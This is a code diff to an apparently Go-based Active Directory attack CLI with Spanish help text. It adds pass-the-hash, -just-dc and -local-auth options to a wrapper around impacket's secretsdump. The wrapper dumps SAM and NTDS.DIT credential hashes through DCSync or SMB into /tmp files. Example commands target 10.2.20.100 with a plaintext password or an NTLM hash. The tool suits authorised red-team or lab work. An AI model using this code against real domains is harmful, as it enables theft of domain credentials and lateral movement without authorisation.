@@ -433,17 +433,22 @@ func (cl *CLI) cmdASREP(args []string) {
 
 // ── secretsdump ───────────────────────────────────────────────────────────────
 
-const secretsdumpUsage = `uso: secretsdump <target> -u <user> -p <pass> [-d <domain>]
+const secretsdumpUsage = `uso: secretsdump <target> -u <user> -p <pass> [-d <domain>] [-H <hash>] [-just-dc] [-local-auth]
 
   Vuelca hashes del SAM/NTDS.DIT vía DCSync o SMB.
+  Cuando -d está presente agrega -just-dc automáticamente (evita bug DRSUAPI en DCs hijo).
+  -H          NTLM hash :NT (pass-the-hash)
+  -just-dc    fuerza solo DRSUAPI/NTDS (sin VSS/registro)
+  -local-auth autentica como cuenta local en lugar de dominio
 
 ejemplos:
   secretsdump 10.2.20.100 -u localuser -p password
-  secretsdump 10.2.20.100 -u Administrator -p password -d cs.org`
+  secretsdump 10.2.20.100 -u Administrator -p password -d cs.org
+  secretsdump 10.2.20.100 -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c -d cs.org`
 
 func (cl *CLI) cmdSecretsDump(args []string) {
 	pos, flags := parseLocalFlags(args)
-	if len(pos) == 0 || flags["u"] == "" || flags["p"] == "" {
+	if len(pos) == 0 || flags["u"] == "" || (flags["p"] == "" && flags["H"] == "") {
 		fmt.Println(secretsdumpUsage)
 		return
 	}
@@ -453,13 +458,36 @@ func (cl *CLI) cmdSecretsDump(args []string) {
 	}
 	target, user, pass := pos[0], flags["u"], flags["p"]
 	domain := flags["d"]
+	hash := flags["H"]
+
+	var extra []string
+	if hash != "" {
+		if !strings.Contains(hash, ":") {
+			hash = ":" + hash
+		}
+		extra = append(extra, "-hashes", hash)
+	}
+
 	identity := user + ":" + pass + "@" + target
 	if domain != "" {
 		identity = domain + "/" + identity
 	}
+
 	outBase := "/tmp/ntds_" + strings.ReplaceAll(target, ".", "_")
 	fmt.Printf("[*] secretsdump → %s  output=%s.*\n", target, outBase)
-	cl.runTool([]string{tool, identity, "-outputfile", outBase})
+
+	cmd := append([]string{tool}, extra...)
+	cmd = append(cmd, identity, "-outputfile", outBase)
+	// When targeting a DC with domain credentials, use -just-dc to avoid
+	// the impacket DRSUAPI bug (ERROR_DS_DRA_BAD_DN on child domain DCs)
+	// triggered by the second GUID-based DRSGetNCChanges call.
+	if domain != "" && flags["just-dc"] == "" {
+		cmd = append(cmd, "-just-dc")
+	}
+	if flags["local-auth"] != "" {
+		cmd = append(cmd, "-local-auth")
+	}
+	cl.runTool(cmd)
 }
 
 // ── bloodhound ────────────────────────────────────────────────────────────────
